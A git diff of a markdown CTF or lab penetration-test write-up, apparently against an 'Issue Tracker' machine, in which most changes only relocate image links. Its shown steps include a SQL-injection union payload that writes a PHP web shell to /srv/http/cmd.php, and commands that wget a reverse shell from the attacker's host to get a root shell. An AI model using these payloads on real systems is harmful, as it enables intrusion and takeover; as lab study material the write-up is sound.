@@ -354,38 +354,38 @@ Enumerated top 200 UDP ports:
 
 #### -Ran feroxbuster scan [feroxbuster -u http://192.168.65.147:50080 -C 401 403 405] and found directory "/cloud"
 
-![](Pasted%20image%2020221011100749.png)
+![](Images/Pasted%20image%2020221011100749.png)
 
 
 #### -Navigated to http://192.168.65.147:50080/cloud and found the following login php page:
-![](Pasted%20image%2020221011100923.png)
+![](Images/Pasted%20image%2020221011100923.png)
 
 #### -Attempted to utilize username admin and password admin and was able to login as admin 
 
 #### -Clicked on the issuetracker.zip file 
-![](Pasted%20image%2020221011101035.png)
+![](Images/Pasted%20image%2020221011101035.png)
 
 #issuetracker
 
 #### -The following webpage came up and clicked the 3 dots and clicked "Descargar" which allowed me to save the zip file to my kali machine:
 
-![](Pasted%20image%2020221011102057.png)
+![](Images/Pasted%20image%2020221011102057.png)
 
 #### -Navigated throught the following source code folders for the "issuetracker.zip" file and found "IssueControler.java" file:
 
-![](Pasted%20image%2020221011102341.png)
+![](Images/Pasted%20image%2020221011102341.png)
 
-![](Pasted%20image%2020221011102413.png)
+![](Images/Pasted%20image%2020221011102413.png)
 
-![](Pasted%20image%2020221011102447.png)
+![](Images/Pasted%20image%2020221011102447.png)
 
-![](Pasted%20image%2020221011102523.png)
+![](Images/Pasted%20image%2020221011102523.png)
 
-![](Pasted%20image%2020221011102555.png)
+![](Images/Pasted%20image%2020221011102555.png)
 
-![](Pasted%20image%2020221011102626.png)
+![](Images/Pasted%20image%2020221011102626.png)
 
-![](Pasted%20image%2020221011102716.png)
+![](Images/Pasted%20image%2020221011102716.png)
 
 #### -Located the following information:
 #### "/issue/checkByPriority" directory
@@ -393,40 +393,40 @@ Enumerated top 200 UDP ports:
 #### Issue Tracker connects to mysql database per the following line of code:
 #### "jdbc:mysql://localhost:3306/issue_tracker"
 
-![](Pasted%20image%2020221011102828.png)
+![](Images/Pasted%20image%2020221011102828.png)
 
 #### -Additionaly, I found "priority" as a parameter in the "/issue/checkByPriority" directory and should be vulnerable to sql injection:
 
-![](Pasted%20image%2020221011102910.png)
+![](Images/Pasted%20image%2020221011102910.png)
 
 ## Port 30455 - HTTP nginx 1.18.0 
 
 #### -Ran feroxbuster scan and found the following:
 
-![](Pasted%20image%2020221011103134.png)
+![](Images/Pasted%20image%2020221011103134.png)
 
 #### -Navigated to http://192.168.241.147:30455/phpinfo.php and found "/srv/http" showing the directory of the webserver:
 
-![](Pasted%20image%2020221011103221.png)
+![](Images/Pasted%20image%2020221011103221.png)
 
 ## Port 17445 - HTTP uknown
 
 #### -Navigated to http://192.168.65.147:17445/ and found the following wepage showing as "Issue Tracker"
 
-![](Pasted%20image%2020221011103451.png)
+![](Images/Pasted%20image%2020221011103451.png)
 
 #### -Clicked the "Register" link and registered and signed in with the credentials I created
 #### -Navigated to directory "/issue/checkByPriority" per the findings this directory existed from analyzing the source code in the "IssueControler.java" file and was directed to the following web page:
 
-![](Pasted%20image%2020221011103541.png)
+![](Images/Pasted%20image%2020221011103541.png)
 
 #### -As we know the directory "/issue/checkByPriority" exists I navigated to Burpsuite to confirm what is going on in the background. Forwarded the request to "repeater" and found the following showing that "POST" is allowed:
 
-![](Pasted%20image%2020221011103632.png)
+![](Images/Pasted%20image%2020221011103632.png)
 
 #### -Changed "GET" to "POST" and found the error code changed from "405" to "400"
 
-![](Pasted%20image%2020221011103739.png)
+![](Images/Pasted%20image%2020221011103739.png)
 
 #GETtoPOSTChangeInBurpsuite
 
@@ -436,45 +436,30 @@ Enumerated top 200 UDP ports:
 ## SQL Injection in Burpsuite
 #### -Googled "sql injection reverse shell" and found the following web page showing the following commands to upload a cmd.php page to the server in order to get command execution:
 
-![](Pasted%20image%2020221011103839.png)
+![](Images/Pasted%20image%2020221011103839.png)
 
-![](Pasted%20image%2020221011103926.png)
+![](Images/Pasted%20image%2020221011103926.png)
 
 #### -URL encoded the following commands:
 "' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php'"
 
 #### -Added "priority='' paramater and the URL encoded syntax above into Burpsuite and forwarded the request:
 
-![](Pasted%20image%2020221011104021.png)
+![](Images/Pasted%20image%2020221011104021.png)
 
 #### -Navigated to "http://192.168.213.147:30455/cmd.php?cmd=" and typed "whoami" and confirmed we can run os commands:
 
-![](Pasted%20image%2020221011104107.png)
+![](Images/Pasted%20image%2020221011104107.png)
 
 #sqlinjection
 
+#### -Saved "/usr/share/webshells/php/php-reverse-shell.php" to a file named "rev1.php" on my kali machine
+#php-reverse-shell-php
 
+#### -Typed "http://192.168.228.147/cmd.php?cmd=wget http://[kali IP]:30455/rev1.php -o /srv/http/rev1.php"
+#### -Typed "http://192.168.228.147/cmd.php?cmd=mv rev1.php.1 rev2.php" as I found the reverse shell script got renamed to "rev1.php.1". (As the file originally ended in ".1" the reverse shell was unable to be executed as it needs to end in extension ".php" to execute)
+
+#### -Set up a listener on port 30455. Typed "curl http://192.168.213.147:30455/rev2.php " on my kali machine and received a root shell:
+
+![](Images/Pasted%20image%2020221011185330.png)
 ---
-
-# Lateral Movement to user
-## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
-## Lateral Movement vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
----
-
-# Privilege Escalation
-## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
-## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
----
-
-# Trophy & Loot
-user.txt
-
-root.txt
